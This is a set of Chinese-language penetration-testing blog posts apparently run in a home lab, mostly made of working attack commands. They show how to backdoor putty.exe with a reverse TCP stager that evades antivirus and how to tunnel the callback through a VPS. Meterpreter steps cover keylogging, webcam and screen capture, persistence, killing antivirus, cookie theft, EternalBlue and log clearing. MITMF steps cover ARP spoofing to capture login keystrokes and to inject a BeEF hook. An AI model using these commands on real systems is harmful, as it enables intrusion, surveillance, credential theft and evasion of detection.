<h2 id="0x02-BDF安装"><a href="#0x02-BDF安装" class="headerlink" title="0x02. BDF安装"></a>0x02. BDF安装</h2><h3 id="emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"><a href="#emsp-emsp-kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱" class="headerlink" title="&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱"></a>&emsp;&emsp;kali其实自带有BDF，不过貌似它的执行环境出了点BUG，所以果断放弃在kali上使用，笔者选择投向docker的怀抱</h3><blockquote>
<p>docker pull secretsquirrel/the-backdoor-factory</p>
<p>docker run -it -v /Users/apple1/Desktop/:/tmp secretsquirrel/the-backdoor-factory bash</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/44CB258820CB477EB4F211B7A63D08CA/3112" alt="image"></p>
<h3 id="【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"><a href="#【-】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章" class="headerlink" title="【*】这里已经启动了docker中的BDF，不太了解docker的可以看看这篇文章"></a>【*】这里已经启动了docker中的BDF，不太了解docker的可以看看<a href="http://120.78.87.14/?p=719" target="_blank" rel="external">这篇文章</a></h3><hr>
<h2 id="0x03-BDF生成免杀木马"><a href="#0x03-BDF生成免杀木马" class="headerlink" title="0x03. BDF生成免杀木马"></a>0x03. BDF生成免杀木马</h2><h3 id="1-下载将要被注入木马的模版文件"><a href="#1-下载将要被注入木马的模版文件" class="headerlink" title="1. 下载将要被注入木马的模版文件"></a>1. 下载将要被注入木马的模版文件</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EB8C1C8CBEE5416E9FA58026B7C950EF/3124" alt="image"></p>
<h3 id="2-利用BDF生成木马"><a href="#2-利用BDF生成木马" class="headerlink" title="2. 利用BDF生成木马"></a>2. 利用BDF生成木马</h3><blockquote>
<p>./backdoor.py -f /tmp/putty.exe -s iat_reverse_tcp_stager_threaded -J -H 1.1.1.1 -P 4444</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/36A5444E02914ABDBBC8D8CEC35DF77D/3134" alt="image"></p>
<h3 id="3-将生成的木马拖到物理机上"><a href="#3-将生成的木马拖到物理机上" class="headerlink" title="3. 将生成的木马拖到物理机上"></a>3. 将生成的木马拖到物理机上</h3><blockquote>
<p>mv&emsp;/the-backdoor-factory/backdoored/putty.exe&emsp;/tmp/payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/37B7A19072504B0EA5CB1707961D9342/3140" alt="image"></p>
<h3 id="4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"><a href="#4-查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉" class="headerlink" title="4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉"></a>4. 查杀木马，笔者用的avira，此时会达到免杀，不过360的话会被直接杀掉</h3><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/EDA07B6C52C045D7A0D690CCC79C6E3A/3147" alt="image"></p>
<hr>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。"><a href="#emsp-emsp-工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI-tool，将它用于安全领域，在此立个Flag。" class="headerlink" title="&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。"></a>&emsp;&emsp;工具再厉害也不能像人那样变通，所以笔者比较向往AI技术。在遥远的将来有一个梦想：自己写一款AI tool，将它用于安全领域，在此立个Flag。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Metasploit]]></title>
      <url>/2017/10/08/Metasploit/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Metasploit-Framework简介"><a href="#0x00-Metasploit-Framework简介" class="headerlink" title="0x00. Metasploit Framework简介"></a>0x00. Metasploit Framework简介</h2><h4 id="emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"><a href="#emsp-emsp-Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！" class="headerlink" title="&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！"></a>&emsp;&emsp;Metasploit是目前最流行、最强大、最具扩展性的渗透测试平台软件，是笔者最崇拜也最喜欢的工具没有之一，下面我将用msf给大家带来一场盛大的内网渗透体验，别眨眼噢！</h4><a id="more"></a>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/WEBRESOURCE3e65a795a3f7fcac430185b407c010bb/2777" alt="image"></p>
<hr>
<h2 id="0x01-实战操作"><a href="#0x01-实战操作" class="headerlink" title="0x01. 实战操作"></a>0x01. 实战操作</h2><h2 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h2><h4 id="1-靶机win-7-emsp-IP-192-168-43-150"><a href="#1-靶机win-7-emsp-IP-192-168-43-150" class="headerlink" title="1. 靶机win 7 &emsp; IP=192.168.43.150"></a>1. 靶机win 7 &emsp; IP=192.168.43.150</h4><h4 id="2-kali-linux-emsp-IP-192-168-43-153"><a href="#2-kali-linux-emsp-IP-192-168-43-153" class="headerlink" title="2. kali linux &emsp; IP=192.168.43.153"></a>2. kali linux &emsp; IP=192.168.43.153</h4><h4 id="3-VPS服务器-emsp-IP-xx-xx-xx-xx"><a href="#3-VPS服务器-emsp-IP-xx-xx-xx-xx" class="headerlink" title="3. VPS服务器 &emsp; IP=xx.xx.xx.xx"></a>3. VPS服务器 &emsp; IP=xx.xx.xx.xx</h4><h2 id="实战演示："><a href="#实战演示：" class="headerlink" title="实战演示："></a>实战演示：</h2><h3 id="1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"><a href="#1-先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）" class="headerlink" title="1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）"></a>1. 先用evil-evasion生成具有一定免杀功能的windows木马，监听地址设成VPS的地址（打码防D），然后将VPS上的2333端口映射到内网kali的2333端口，同时还要修改VPS上的ssh配置，不然别人是连不上VPS的（在实战中自己常常在内网，所以这里介绍一下VPS）</h3><blockquote>
<p>vi /etc/ssh/sshd_config &amp;&amp; GatewayPorts:yes</p>
<p>ssh -CfNg -R xx.xx.xx.xx:2333:192.168.43.153:2333 root@xx.xx.xx.xx -p 29402</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/B0A29DC18557456A8233E113B2E545A7/2805" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE26F3A8040346ABAB760ECE9324382F/2786" alt="image"></p>
<h3 id="2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"><a href="#2-启动kali设置msf监听，lport-2333，lhost-192-168-43-153-注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章" class="headerlink" title="2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个系列文章"></a>2. 启动kali设置msf监听，lport=2333，lhost=192.168.43.153(注意：这里的监听地址是kali的地址，不是VPS的），关于msf的基本操作网上有很多，这里不过多介绍，大家可以参考这个<a href="http://www.freebuf.com/sectool/67674.html" target="_blank" rel="external">系列文章</a></h3><blockquote>
<p>[*]如果想要在docker启动持续监听可以用如下命令</p>
<p>set exitonsession false &amp;&amp; run -j</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/9CD797025E3C4F73B6249F645BFB89A9/2796" alt="image"></p>
<h3 id="3-在win-7-中执行木马"><a href="#3-在win-7-中执行木马" class="headerlink" title="3. 在win 7 中执行木马"></a>3. 在win 7 中执行木马</h3><p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/5A6F7DAC4D274B64A4CFD66B0080B835/2803" alt="image"></p>
<h3 id="4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程"><a href="#4-接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win-7的桌面进程" class="headerlink" title="4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程"></a>4. 接收到meterpreter之后就应该将自己的进程迁移到一个隐蔽的进程中去，防止被查杀，这里笔者迁移到win 7的桌面进程</h3><blockquote>
<p>migrate 1988 &amp;&amp; getpid</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6F701A71ADC74D9886456ACAD234579A/2807" alt="image"></p>
<h3 id="5-查看当前权限、系统信息，并尝试提权"><a href="#5-查看当前权限、系统信息，并尝试提权" class="headerlink" title="5. 查看当前权限、系统信息，并尝试提权"></a>5. 查看当前权限、系统信息，并尝试提权</h3><blockquote>
<p>getuid &amp;&amp; sysinfo &amp;&amp; getsystem</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/E4A2C214EB80482099D8EC2FAD4EAD5B/2809" alt="image"></p>
<h3 id="6-查看网络、路由信息"><a href="#6-查看网络、路由信息" class="headerlink" title="6. 查看网络、路由信息"></a>6. 查看网络、路由信息</h3><blockquote>
<p>ifconfig &amp;&amp; route</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6952617E2F0C487D9961361455423D8F/2811" alt="image"></p>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7BD2DDFFF9C34C97BCC4B83CBBCE460F/2813" alt="image"></p>
<h3 id="7-监视靶机的桌面"><a href="#7-监视靶机的桌面" class="headerlink" title="7. 监视靶机的桌面"></a>7. 监视靶机的桌面</h3><blockquote>
<p>run vnc</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1341936A33D348D9BFA015BD4152A84B/2815" alt="image"></p>
<h3 id="8-启动键盘监听"><a href="#8-启动键盘监听" class="headerlink" title="8. 启动键盘监听"></a>8. 启动键盘监听</h3><blockquote>
<p>keyscan_start &amp;&amp; keyscan_dump</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1048F53C0DB74D29B1966D4DAEFB375C/2817" alt="image"></p>
<h3 id="9-设置后门，维持权限"><a href="#9-设置后门，维持权限" class="headerlink" title="9. 设置后门，维持权限"></a>9. 设置后门，维持权限</h3><blockquote>
<p>run metsvc -A<br>use exploit/multi/handler<br>set payload windows/metsvc_bind_tcp</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115559_zGxh98_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418115615_n2yKpJ_Screenshot.jpeg" alt=""></p>
<h3 id="10-截屏查看靶机当前桌面"><a href="#10-截屏查看靶机当前桌面" class="headerlink" title="10. 截屏查看靶机当前桌面"></a>10. 截屏查看靶机当前桌面</h3><blockquote>
<p>screenshot</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/6AA05CFBB24A4F58B4B4073C76EA86E7/2821" alt="image"></p>
<h3 id="11-查看当前系统空闲时间"><a href="#11-查看当前系统空闲时间" class="headerlink" title="11. 查看当前系统空闲时间"></a>11. 查看当前系统空闲时间</h3><blockquote>
<p>idletime</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/79CB8D02C9DE4A5AA6B59C8064C0406B/2823" alt="image"></p>
<h3 id="12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）"><a href="#12-禁用靶机使用键盘鼠标（笔者win-7系统是64位的，不支持这个操作）" class="headerlink" title="12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）"></a>12. 禁用靶机使用键盘鼠标（笔者win 7系统是64位的，不支持这个操作）</h3><blockquote>
<p>uictl disable keyboard</p>
<p>uictl disable mouse</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/1153DFFD1E3E45148071B6547CF0CB28/2825" alt="image"></p>
<h3 id="13-查找靶机中重要的敏感文件"><a href="#13-查找靶机中重要的敏感文件" class="headerlink" title="13. 查找靶机中重要的敏感文件"></a>13. 查找靶机中重要的敏感文件</h3><blockquote>
<p>search -d c:\\ -f payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/7FA2C1C2A0F9495D853E8DBE84F3F921/2829" alt="image"></p>
<h3 id="14-指定下载靶机中的文件到本地"><a href="#14-指定下载靶机中的文件到本地" class="headerlink" title="14. 指定下载靶机中的文件到本地"></a>14. 指定下载靶机中的文件到本地</h3><blockquote>
<p>dowmload&emsp;c:\\Users\\root\\Desktop\\payload.exe&emsp;/root/Desktop</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/D64579685D6946E0A1778127C2DC0C89/2831" alt="image"></p>
<h3 id="15-上传指定本地文件到靶机中"><a href="#15-上传指定本地文件到靶机中" class="headerlink" title="15. 上传指定本地文件到靶机中"></a>15. 上传指定本地文件到靶机中</h3><blockquote>
<p>upload&emsp;/root/Desktop/hack.jpeg&emsp;c:\\Users\\root\\Desktop\\payload.exe</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/590D4B293166484BB1B80C740B766889/2833" alt="image"></p>
<h3 id="16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应"><a href="#16-打开靶机摄像头，win-7虚拟机没有摄像头所以没反应" class="headerlink" title="16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应"></a>16. 打开靶机摄像头，win 7虚拟机没有摄像头所以没反应</h3><blockquote>
<p>webcam_snap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/30AFC5056C0C488CAC1B401A54657300/2835" alt="image"></p>
<h3 id="17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"><a href="#17-将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面" class="headerlink" title="17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面"></a>17. 将靶机3389端口映射到本地3344，这样连接本地3344端口就能连接靶机的远程桌面</h3><blockquote>
<p>portfwd add -l 3344 -p 3389 -r 127.0.0.1</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418114855_mYPjG6_Screenshot.jpeg" alt=""></p>
<hr>
<h1 id="0x02-后渗透测试"><a href="#0x02-后渗透测试" class="headerlink" title="0x02. 后渗透测试"></a>0x02. 后渗透测试</h1><h3 id="1-调用post模块查看当前系统可用的提权模块"><a href="#1-调用post模块查看当前系统可用的提权模块" class="headerlink" title="1. 调用post模块查看当前系统可用的提权模块"></a>1. 调用post模块查看当前系统可用的提权模块</h3><blockquote>
<p>run post/multi/recon/local_exploit_suggester</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/062DCEF953D0483885263D3B68EA6500/2837" alt="image"></p>
<h3 id="2-调用payload模块对靶机进行远程桌面操作"><a href="#2-调用payload模块对靶机进行远程桌面操作" class="headerlink" title="2. 调用payload模块对靶机进行远程桌面操作"></a>2. 调用payload模块对靶机进行远程桌面操作</h3><blockquote>
<p>set payload windows/vncinject/reverse_tcp</p>
<p>set viewonly no </p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/24C3AE7DA38B47D38AD244E1A85412BD/2839" alt="image"></p>
<h3 id="3-关掉靶机中的杀软"><a href="#3-关掉靶机中的杀软" class="headerlink" title="3. 关掉靶机中的杀软"></a>3. 关掉靶机中的杀软</h3><blockquote>
<p>killav</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/98E2F5E758294B1D99BE113B0CDAD0F3/2841" alt="image"></p>
<h3 id="4-收集靶机浏览器的敏感信息-访问记录、cookie"><a href="#4-收集靶机浏览器的敏感信息-访问记录、cookie" class="headerlink" title="4. 收集靶机浏览器的敏感信息(访问记录、cookie)"></a>4. 收集靶机浏览器的敏感信息(访问记录、cookie)</h3><blockquote>
<p>run post/windows/gather/enum_ie</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C1568F9B9B8746F990D13D51A9BE3367/2843" alt="image"></p>
<h3 id="5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions"><a href="#5-设置路由转发，扫描内网机器开放的端口-route-emsp-add-emsp-靶机IP-emsp-子网掩码-emsp-sessions" class="headerlink" title="5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)"></a>5. 设置路由转发，扫描内网机器开放的端口(route&emsp;add&emsp;靶机IP&emsp;子网掩码&emsp;sessions)</h3><blockquote>
<p>route add 92.168.43.150 255.255.255.0 3</p>
<p>use auxiliary/scanner/portscan/tcp</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/CE904338A187447E9E4C6EB5627C3F3E/2847" alt="image"></p>
<h3 id="6-扫描一波内网有没有ms17-010漏洞的主机"><a href="#6-扫描一波内网有没有ms17-010漏洞的主机" class="headerlink" title="6. 扫描一波内网有没有ms17_010漏洞的主机"></a>6. 扫描一波内网有没有ms17_010漏洞的主机</h3><blockquote>
<p>use auxiliary/scanner/smb/smb_ms17_010</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/935810641BBC43FF8EB483C0AD4A2343/2849" alt="image"></p>
<h3 id="7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波"><a href="#7-笔者扫到win-7就有这个漏洞，然后就愉快的调用exp搞一波" class="headerlink" title="7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波"></a>7. 笔者扫到win 7就有这个漏洞，然后就愉快的调用exp搞一波</h3><blockquote>
<p>use exploit/windows/smb/ms17_010_eternalblue</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/24c01f91bce03ba53320ac04e4235bb1/xmlnote/C4989785A16647D4883A6E243CA78443/2851" alt="image"></p>
<h3 id="8-在靶机的指定应用中注入恶意代码"><a href="#8-在靶机的指定应用中注入恶意代码" class="headerlink" title="8.在靶机的指定应用中注入恶意代码"></a>8.在靶机的指定应用中注入恶意代码</h3><blockquote>
<p>use post/windows/manage/peinjector</p>
</blockquote>
<h3 id="9-功成身退"><a href="#9-功成身退" class="headerlink" title="9. 功成身退"></a>9. 功成身退</h3><blockquote>
<p>clearev</p>
<hr>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"><a href="#emsp-emsp-msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！" class="headerlink" title="&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！"></a>&emsp;&emsp;msf是真的强大，笔者总结的这些也只算是九牛一毛，大家在平时使用时多总结一定能玩出花儿来！</h4></blockquote>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[MITMF]]></title>
      <url>/2017/10/02/MITMF/</url>
      <content type="html"><![CDATA[<h2 id="0x00-MITMF简介"><a href="#0x00-MITMF简介" class="headerlink" title="0x00. MITMF简介"></a>0x00. MITMF简介</h2><h4 id="emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"><a href="#emsp-emsp-MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。" class="headerlink" title="&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。"></a>&emsp;&emsp;MITMF其实就是一个基于python编写的中间人攻击的框架，就好比metaspoit一样，无比强大且但十分易用。下面笔者就给大家介绍一下它有哪些用途，本文具有攻击性，大家最好在自己的实验环境中使用。</h4><a id="more"></a>
<hr>
<h2 id="0x01-MITMF安装"><a href="#0x01-MITMF安装" class="headerlink" title="0x01. MITMF安装"></a>0x01. MITMF安装</h2><blockquote>
<p>apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file &amp;&amp; apt-get install mitmf</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/9E27BD005D5540E1934FE452379DFAC2/2572" alt="image"></p>
<hr>
<p>pip uninstall twisted &amp;&amp; wget <a href="http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2" target="_blank" rel="external">http://twistedmatrix.com/Releases/Twisted/15.5/Twisted-15.5.0.tar.bz2</a> &amp;&amp; pip install ./Twisted-15.5.0.tar.bz2</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FCCFFCEFDA2945498587A8278D460BDF/2583" alt="image"></p>
<hr>
<p>pip install python-magic &amp;&amp; git clone <a href="https://github.com/secretsquirrel/the-backdoor-factory.git" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory.git</a> &amp;&amp; cd the-backdoor-factory &amp;&amp; ./install.sh</p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/488111F29FED41F785D4100CBCAA9E24/2587" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/FEE9D91E745048719660B931704CBFE1/2589" alt="image"></p>
<hr>
<h2 id="0x02-jskeylogger模块"><a href="#0x02-jskeylogger模块" class="headerlink" title="0x02. jskeylogger模块"></a>0x02. jskeylogger模块</h2><h3 id="1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）"><a href="#1-启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http-127-0-0-1-9999之后却能运行成功，可能是什么BUG）" class="headerlink" title="1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）"></a>1. 启动MITMF的键盘记录模块（注：有时MITMF不能正常运行，但是笔者访问了<a href="http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）" target="_blank" rel="external">http://127.0.0.1:9999之后却能运行成功，可能是什么BUG）</a></h3><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-jskeylogger</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/08471581A373436BA52AF5C79DC84E23/2624" alt="image"></p>
<h3 id="2-靶机登陆淘宝，查看效果（这里编码出了点问题）"><a href="#2-靶机登陆淘宝，查看效果（这里编码出了点问题）" class="headerlink" title="2. 靶机登陆淘宝，查看效果（这里编码出了点问题）"></a>2. 靶机登陆淘宝，查看效果（这里编码出了点问题）</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/0E7E0B2DBA154FEC8F737B1A63D9A63B/2622" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/5BF3C0C24C4B4D1B8F0E1CECB8654F6C/2619" alt="image"></p>
<hr>
<h2 id="0x03-js-url模块"><a href="#0x03-js-url模块" class="headerlink" title="0x03. --js-url模块"></a>0x03. <strong>-</strong>-js-url模块</h2><h3 id="1-启动beef，构造hook-注：beef的账号密码都是beef"><a href="#1-启动beef，构造hook-注：beef的账号密码都是beef" class="headerlink" title="1. 启动beef，构造hook(注：beef的账号密码都是beef)"></a>1. 启动beef，构造hook(注：beef的账号密码都是beef)</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/EB22D3CBBA2B46F5989DE151AE4A330E/2636" alt="image"></p>
<h3 id="2-启动-js-url模块向目标网页插入hook代码"><a href="#2-启动-js-url模块向目标网页插入hook代码" class="headerlink" title="2. 启动--js-url模块向目标网页插入hook代码"></a>2. 启动<strong>-</strong>-js-url模块向目标网页插入hook代码</h3><blockquote>
<p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.106 <strong>-</strong>-inject <strong>-</strong>-js-url <a href="http://192.168.1.105:3000/hook.js" target="_blank" rel="external">http://192.168.1.105:3000/hook.js</a></p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/28035242C8EC463ABB136633BD18CCA1/2643" alt="image"></p>
<h3 id="3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"><a href="#3-启动靶机访问任意页面，可以看到js-已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下" class="headerlink" title="3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下"></a>3. 启动靶机访问任意页面，可以看到js 已经注入到页面当中，玩过beef的都知道它的强大，但是笔者的beef出了点问题，就不给大家演示了，有兴趣的可以自己去搜一下</h3><p><img src="http://note.youdao.com/yws/public/resource/e8a418dc9255ddf08105ed8b1dabded2/xmlnote/6FD54CD991C341BF82D6B8AEBB86425D/2648" alt="image"></p>
<hr>
<h2 id="0x04-filepwn模块"><a href="#0x04-filepwn模块" class="headerlink" title="0x04. --filepwn模块"></a>0x04. <strong>-</strong>-filepwn模块</h2><h3 id="1-启动msf，加载msgrpc模块"><a href="#1-启动msf，加载msgrpc模块" class="headerlink" title="1. 启动msf，加载msgrpc模块"></a>1. 启动msf，加载msgrpc模块</h3><blockquote>
<p>service postgresql start &amp;&amp; msfconsole</p>
<p>load msgrpc</p>
</blockquote>
